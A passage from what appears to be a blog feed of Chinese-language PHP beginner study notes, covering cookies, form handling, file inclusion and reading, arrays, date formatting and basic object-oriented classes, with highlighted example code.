<h2 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h2><p>当删除cookie时，应当使过期日期变为过去的时间点<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 设置 cookie 过期时间为过去 1 小时</span></span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">""</span>, time()<span class="number">-3600</span>);</span></span><br></pre></td></tr></table></figure></p>
<h2 id="浏览器不支持Cookie"><a href="#浏览器不支持Cookie" class="headerlink" title="浏览器不支持Cookie"></a>浏览器不支持Cookie</h2><p>如果有些应用程序需要与不支持cookie的浏览器打交道，那么不得不使用其他方法在应用程序中的页面之间传递信息了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"welcome.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当点击submit按钮时，便向welcome.php提交了输入</p>
<p>welcome.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">欢迎 <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"name"</span>]; <span class="meta">?&gt;</span></span>.<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">你 <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"age"</span>]; <span class="meta">?&gt;</span></span> 岁了。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前</p>
<p>2.如果不想让cookie被URL编码，可以用setrawcookie()函数取代</p>
<p>3.setcookie()中的expire是以秒为单位设置时间的</p>
<p>4.想要删除cookie，依旧用setcookie()函数，区别就是让它变为过去的时间点</p>
<p>5.不能是用cookie的浏览器，就可以通过表单的方式来让信息在应用程序的页面之间传递</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/12-基础10</title>
    <url>/2020/07/12/PHP-2020-7-12-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h1><h2 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h2><p>在PHP中，可以在服务器执行PHP文件之前插入一个文件的内容</p>
<p>include和require除了处理错误的方式不同之外，在其他方向都是相同的</p>
<ul>
<li>require 生成一个致命错误，错误发生后会停止执行</li>
<li>include 生产一个警告，在错误发生后会继续执行</li>
</ul>
<p>如果希望不影响文件执行，推荐使用include</p>
<p>语法<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure></p>
<h1 id="include和require-1"><a href="#include和require-1" class="headerlink" title="include和require"></a>include和require</h1><p>如果你有一个名为header.php，想在页面中引用这个页头文件，就可以使用include/require<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">'header.php'</span>; <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到我的主页!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>一些文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果想在所有页面中使用标准菜单文件<br>menu.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">echo '<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/html"</span>&gt;</span>HTML 教程<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/php"</span>&gt;</span>PHP 教程<span class="tag">&lt;/<span class="name">a</span>&gt;</span>';</span><br></pre></td></tr></table></figure></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"leftmenu"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">'menu.php'</span>; <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到我的主页!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>一些文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><p>PHP中使用fopen()函数打开文件</p>
<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>使用fopen()即可，第一种参数是打开文件的名称，第二个参数规定了使用哪种模式来打开<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>模式 | 描述<br>-|-<br>r | 只读。在文件开头开始<br>r+ | 读/写。在文件开头开始<br>w | 只写。打开并清空文件内容;文件不存在则创建文件<br>w+ | 读/写。打开并清空文件内容;文件不存在则创建文件<br>a | 追加。打开并向文件末尾进行写操作，如果不存在则创建文件<br>a+ | 读/追加。通过向文件末尾写内容，来保持文件内容<br>x | 只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误<br>x+ | 读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误</p>
<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><p>fclose()函数用于关闭打开的文件<br><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行一些代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fclose</span>($file);</span><br></pre></td></tr></table></figure></p>
<h2 id="检测文件末尾-EOF"><a href="#检测文件末尾-EOF" class="headerlink" title="检测文件末尾(EOF)"></a>检测文件末尾(EOF)</h2><p>feof()函数检测是否已到达文件末尾EOF</p>
<p>在循环遍历未知长度的数据时，feof()函数很有用<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if (<span class="name">feof</span>($file)) echo <span class="string">"文件结尾"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="逐行读取文件"><a href="#逐行读取文件" class="headerlink" title="逐行读取文件"></a>逐行读取文件</h2><p>fgets()函数用于从文件中逐行读取文件</p>
<p>再调用该函数之后，文件指针会移动到下一行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">"welcome.txt"</span>, <span class="string">"r"</span>) or <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="regexp">//</span> 读取文件每一行，直到文件结尾</span><br><span class="line"><span class="keyword">while</span>(!feof(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets(<span class="variable">$file</span>). <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
<h2 id="逐行字符读取文件"><a href="#逐行字符读取文件" class="headerlink" title="逐行字符读取文件"></a>逐行字符读取文件</h2><p>fgetc()函数用于从文件中逐字符的读取文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$file</span>=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>) or <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgetc(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.推荐直接使用include包含，如果包含文件出现错误，也不会影响所在文件的正常运行，而require包含则会终止运行</p>
<p>2.文件读取不知道读取文件的行数时，使用feof()函数来参与循环，以实现全部读取</p>
<p>3.fgets()和fgetc()函数用法差不多，前者直接读取完整一行，后者则是一个字一个字的读取</p>
<p>4.fopen中常用的参数就是r r+ w w+ 其他不常用，了解就行</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/11-基础9</title>
    <url>/2020/07/12/PHP-2020-7-11-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h1><p>一个数组中的值可以是另一个数组</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// 二维数组:</span></span><br><span class="line">$cars = <span class="built_in">array</span></span><br><span class="line">(</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"Volvo"</span>,<span class="number">100</span>,<span class="number">96</span>),</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"BMW"</span>,<span class="number">60</span>,<span class="number">59</span>),</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"Toyota"</span>,<span class="number">110</span>,<span class="number">100</span>)</span><br><span class="line">);</span><br><span class="line">print_r($cars);</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Volvo</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">100</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">96</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">60</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">59</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Toyota</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">110</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">100</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>多维数组是包含一个或多个数组的数组</p>
<p>在多维数组中，主数组中的每一个元素也可以是一个数组，子数组中的每一个元素也可以是一个数组</p>
<p>自动分配ID键的多维数组<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$sites = <span class="keyword">array</span></span></span><br><span class="line"><span class="php">(</span></span><br><span class="line"><span class="php">    <span class="string">"runoob"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"菜鸟教程"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.runoob.com"</span></span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">    <span class="string">"google"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"Google 搜索"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.google.com"</span></span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">    <span class="string">"taobao"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"淘宝"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.taobao.com"</span></span></span><br><span class="line"><span class="php">    )</span></span><br><span class="line"><span class="php">);</span></span><br><span class="line"><span class="php">print_r($sites);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [runoob] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; 菜鸟教程</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.runoob.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [google] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Google 搜索</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.google.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [taobao] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; 淘宝</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.taobao.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>如果想要获得某个值，也很简单<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">echo $sites[<span class="string">'taobao'</span>][<span class="symbol">0</span>]."地址请".$sites[<span class="string">'google'</span>][<span class="symbol">0</span>];</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">淘宝地址请Google 搜索</span><br></pre></td></tr></table></figure></p>
<h1 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h1><h2 id="data-函数"><a href="#data-函数" class="headerlink" title="data()函数"></a>data()函数</h2><p>PHP中使用data()函数把时间戳格式化为可读性更好的日期和时间</p>
<p>语法<br><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="keyword">date</span> ( <span class="keyword">string</span> $format [, <span class="keyword">int</span> $timestamp ] )</span><br></pre></td></tr></table></figure><br>其中format是必须存在的，timestamp是可选的，规定时间戳</p>
<h2 id="格式化日期"><a href="#格式化日期" class="headerlink" title="格式化日期"></a>格式化日期</h2><p>data()函数中的第一个参数format规定了如何格式化日期和时间</p>
<ul>
<li>d 代表天</li>
<li>m 代表月份</li>
<li>Y 代表年(四位数)</li>
</ul>
<p>还可以插入/,-之类的字符来增加可读性</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y/m/d"</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y.m.d"</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y-m-d"</span>);</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">12</span></span><br><span class="line"><span class="number">2020.07</span><span class="number">.12</span></span><br><span class="line"><span class="number">2020</span><span class="number">-07</span><span class="number">-12</span></span><br></pre></td></tr></table></figure></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>format</th>
<th>说明</th>
<th>返回值例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td>月份中的第几天</td>
<td>01到31</td>
</tr>
<tr>
<td>D</td>
<td>星期中的第几天</td>
<td>Mon到Sun</td>
</tr>
<tr>
<td>j</td>
<td>月份中的第几天，无前导零</td>
<td>1到31</td>
</tr>
<tr>
<td>l</td>
<td>星期几 完整格式</td>
<td>Sunday到Saturday</td>
</tr>
<tr>
<td>w</td>
<td>星期几 数字表示</td>
<td>0到6</td>
</tr>
<tr>
<td>z</td>
<td>年份中的第几天</td>
<td>0到356</td>
</tr>
<tr>
<td>F</td>
<td>月份，完整格式</td>
<td>January到December</td>
</tr>
<tr>
<td>m</td>
<td>数字表示月份</td>
<td>01到12</td>
</tr>
<tr>
<td>M</td>
<td>三个字母缩写月份</td>
<td>Jan到Dec</td>
</tr>
<tr>
<td>n</td>
<td>数字表示月份 无前置</td>
<td>1到12</td>
</tr>
<tr>
<td>Y</td>
<td>4位数字完整年份</td>
<td>1999或2003</td>
</tr>
<tr>
<td>y</td>
<td>2位数字表示年份</td>
<td>99或03</td>
</tr>
<tr>
<td>g</td>
<td>小时，12小时 无前置</td>
<td>1到12</td>
</tr>
<tr>
<td>G</td>
<td>小时 24小时 无前置</td>
<td>0到23</td>
</tr>
<tr>
<td>h</td>
<td>小时 12小时</td>
<td>01到12</td>
</tr>
<tr>
<td>H</td>
<td>小时 24小时</td>
<td>00到23</td>
</tr>
<tr>
<td>s</td>
<td>秒</td>
<td>00到59</td>
</tr>
</tbody>
</table>
</div>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.多维数组基本和C++相似，调用方式也一样，基本不变，参考C++即可</p>
<p>2.data函数的format参数是必须的，可以加上/ . -等符号来增加可读性</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/10-基础8</title>
    <url>/2020/07/10/PHP-2020-7-10-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>面向对象已经很熟悉了，基本上就一句话总结，类是虚指，对象是类的实例</p>
<h2 id="对象内容"><a href="#对象内容" class="headerlink" title="对象内容"></a>对象内容</h2><ul>
<li>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作</li>
<li>对象 − 是类的实例</li>
<li>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性</li>
<li>成员函数 − 定义在类的内部，可用于访问对象的数据</li>
</ul>
<p>例如<br><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$mercedes</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br><span class="line"><span class="built_in">$bmw</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br><span class="line"><span class="built_in">$audi</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h2><p>定义类通常语法格式如下:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">phpClass</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $var1;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $var2 = <span class="string">"constant string"</span>;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> <span class="params">($arg1, $arg2)</span> </span>&#123;</span></span><br><span class="line"><span class="php">     [..]</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  [..]</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>类使用class关键字后加上类名定义</p>
<p>类名后的一对大括号内可以定义变量和方法</p>
<p>类的变量使用var来声明，也可以直接初始化值</p>
<p>函数定义不变，但是函数只能通过实例化的类来使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员变量 */</span></span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $url;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $title;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员函数 */</span></span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;url = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;title = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>$this 代表自身的对象</li>
<li>PHP_EOL为换行符</li>
</ul>
<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>创建对象使用new关键字来实例化<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$ru</span>noob = <span class="keyword">new</span> Site;</span><br><span class="line"><span class="symbol">$tao</span>bao = <span class="keyword">new</span> Site;</span><br><span class="line"><span class="symbol">$google</span> = <span class="keyword">new</span> Site;</span><br></pre></td></tr></table></figure></p>
<h3 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> );</span><br><span class="line">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> );</span><br><span class="line">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line">$runoob-&gt;getTitle();</span><br><span class="line">$taobao-&gt;getTitle();</span><br><span class="line">$google-&gt;getTitle();</span><br></pre></td></tr></table></figure>
<p>完整演示<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员变量 */</span></span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $url;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $title;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员函数 */</span></span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;url = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;title = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob = <span class="keyword">new</span> Site;</span></span><br><span class="line"><span class="php">$taobao = <span class="keyword">new</span> Site;</span></span><br><span class="line"><span class="php">$google = <span class="keyword">new</span> Site;</span></span><br><span class="line"></span><br><span class="line"><span 